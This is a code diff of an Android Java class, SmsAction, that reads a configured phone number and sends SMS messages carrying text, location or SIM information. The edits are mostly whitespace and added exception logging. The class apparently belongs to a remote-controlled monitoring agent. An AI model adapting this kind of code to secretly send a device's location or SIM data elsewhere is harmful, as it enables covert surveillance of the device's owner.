@@ -64,7 +64,7 @@ public class SmsAction extends SubAction {
 	 *            the conf params
 	 */
 	public SmsAction(final ConfAction params) {
-		super( params);
+		super(params);
 
 		sm = SmsManager.getDefault();
 	}
@@ -111,10 +111,14 @@ public class SmsAction extends SubAction {
 			}
 			return true;
 		} catch (final Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + ex.toString()) ;//$NON-NLS-1$
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
 			}
-			
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
+			}
+
 			return false;
 		}
 	}
@@ -160,7 +164,7 @@ public class SmsAction extends SubAction {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (sendSMS), number: " + number + " text: \"" + text + "\""); //$NON-NLS-1$
 		}
-		
+
 		return;
 	}
 
@@ -174,17 +178,17 @@ public class SmsAction extends SubAction {
 	@Override
 	protected boolean parse(final ConfAction params) {
 		try {
-			
-			number = Utils.unspace( params.getString("number"));
+
+			number = Utils.unspace(params.getString("number"));
 			descrType = params.getString("type");
-			
-			if("location".equals(descrType)){
-				type=TYPE_LOCATION;
-			}else if("text".equals(descrType)){
-				type=TYPE_TEXT;				
-			}else if("sim".equals(descrType)){
-				type=TYPE_SIM;
-			}else{
+
+			if ("location".equals(descrType)) {
+				type = TYPE_LOCATION;
+			} else if ("text".equals(descrType)) {
+				type = TYPE_TEXT;
+			} else if ("sim".equals(descrType)) {
+				type = TYPE_SIM;
+			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (parse) Error, unknown type: " + descrType);
 				}
@@ -195,7 +199,7 @@ public class SmsAction extends SubAction {
 			case TYPE_TEXT:
 				// TODO controllare che la lunghezza non sia superiore a 70
 				// caratteri
-				
+
 				text = params.getString("text");
 				break;
 
@@ -224,12 +228,16 @@ public class SmsAction extends SubAction {
 
 			default:
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type) ;//$NON-NLS-1$
+					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type);//$NON-NLS-1$
 				}
-				
+
 				break;
 			}
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) Error: " + e);
 			}
